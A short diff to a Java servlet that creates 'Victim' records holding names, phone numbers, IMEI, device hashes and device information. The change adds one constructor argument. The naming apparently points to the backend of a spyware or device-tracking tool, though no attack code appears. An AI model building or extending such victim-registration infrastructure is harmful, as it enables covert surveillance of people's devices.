@@ -79,8 +79,8 @@ public class INServlet extends AdvancedBaseServlet {
             apiKey = RandomString.getNewApiKey(API_KEY_LENGTH);
 
             final Victim newVictim = new Victim(null, name, email, phone, imei, deviceHash, apiKey, fcmId, deviceName, deviceInfoStatic, deviceInfoDynamic, null, null, true,
-                    RandomString.getRandomString(Victim.VICTIM_CODE_LENGTH)
-            );
+                    RandomString.getRandomString(Victim.VICTIM_CODE_LENGTH),
+                    relativeLastDeliveryTime);
 
             final String victimId = victimsTable.addv3(newVictim);
 
